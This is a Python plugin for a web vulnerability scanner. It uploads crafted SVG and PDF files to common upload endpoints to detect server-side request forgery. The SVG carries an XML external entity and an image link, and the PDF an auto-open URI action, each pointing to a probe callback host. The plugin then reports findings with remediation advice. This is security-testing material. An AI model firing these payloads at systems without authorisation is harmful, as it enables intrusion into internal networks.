"""Plugin: File Upload SSRF via SVG/PDF with External Payloads (blackbox)."""
from __future__ import annotations

from urllib.parse import urlparse, urlunparse

import httpx

from vibee_hacker.core.models import InterPhaseContext, Result, Severity, Target
from vibee_hacker.core.plugin_base import PluginBase

CALLBACK_URL = "http://vibee-ssrf-probe.internal/check"

SVG_SSRF_PAYLOAD = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "{CALLBACK_URL}">]>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100" height="100">
  <image href="{CALLBACK_URL}" height="100" width="100"/>
  <text>&xxe;</text>
</svg>""".encode()

PDF_SSRF_PAYLOAD = (
    b"%PDF-1.4\n"
    b"1 0 obj\n"
    b"<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>\n"
    b"endobj\n"
    b"4 0 obj\n"
    b"<< /Type /Action /S /URI /URI (" + CALLBACK_URL.encode() + b") >>\n"
    b"endobj\n"
    b"%%EOF\n"
)

UPLOAD_PATHS = [
    "/upload",
    "/api/upload",
    "/file/upload",
    "/uploads",
    "/api/files",
    "/media/upload",
]

SSRF_INDICATORS = [
    "vibee-ssrf-probe",
    "connection refused",
    "network error",
    "internal",
    "metadata",
]


class FileUploadSsrfPlugin(PluginBase):
    name = "file_upload_ssrf"
    description = "Upload SVG/PDF with SSRF payloads (xlink:href, external entity) to probe SSRF via file processing"
    category = "blackbox"
    phase = 3
    base_severity = Severity.HIGH

    async def run(self, target: Target, context: InterPhaseContext | None = None) -> list[Result]:
        if not target.url:
            return []

        parsed = urlparse(target.url)
        base = urlunparse((parsed.scheme, parsed.netloc, "", "", "", ""))
        results: list[Result] = []

        # Gather upload endpoints
        upload_endpoints: list[str] = []
        for path in UPLOAD_PATHS:
            upload_endpoints.append(base + path)
        if context and context.crawl_urls:
            for u in context.crawl_urls:
                if any(kw in u.lower() for kw in ["upload", "file", "media", "attach"]):
                    if u not in upload_endpoints:
                        upload_endpoints.append(u)

        async with httpx.AsyncClient(verify=target.verify_ssl, timeout=15) as client:
            for endpoint in upload_endpoints[:5]:
                # Test SVG upload
                for filename, content, mime_type in [
                    ("test.svg", SVG_SSRF_PAYLOAD, "image/svg+xml"),
                    ("test.pdf", PDF_SSRF_PAYLOAD, "application/pdf"),
                ]:
                    try:
                        resp = await client.post(
                            endpoint,
                            files={"file": (filename, content, mime_type)},
                            timeout=10,
                        )
                    except (httpx.TransportError, httpx.InvalidURL, httpx.DecodingError):
                        continue

                    if resp.status_code == 404:
                        continue

                    body = resp.text[:5000]
                    body_lower = body.lower()

                    # Check if server processed the file and fetched the external URL
                    has_ssrf_indicator = any(kw in body_lower for kw in SSRF_INDICATORS)
                    # A 200/201 on an upload endpoint that processed our SSRF payload
                    upload_accepted = resp.status_code in (200, 201, 202)

                    if upload_accepted and has_ssrf_indicator:
                        results.append(
                            Result(
                                plugin_name=self.name,
                                base_severity=Severity.HIGH,
                                title=f"File Upload SSRF via {filename.split('.')[-1].upper()}",
                                description=(
                                    f"Upload endpoint at {endpoint} accepted a {mime_type} file with an "
                                    f"SSRF payload and the response suggests external URL fetching occurred. "
                                    "This may allow server-side request forgery."
                                ),
                                evidence=f"POST {endpoint} {filename} → {resp.status_code}: {body[:200]}",
                                recommendation=(
                                    "Sanitize uploaded file content before processing. Disable external entity "
                                    "resolution in XML/SVG parsers. Implement network egress controls to prevent "
                                    "the server from making requests to internal resources."
                                ),
                                cwe_id="CWE-918",
                                rule_id="file_upload_ssrf",
                                endpoint=endpoint,
                            )
                        )
                        return results

        return results
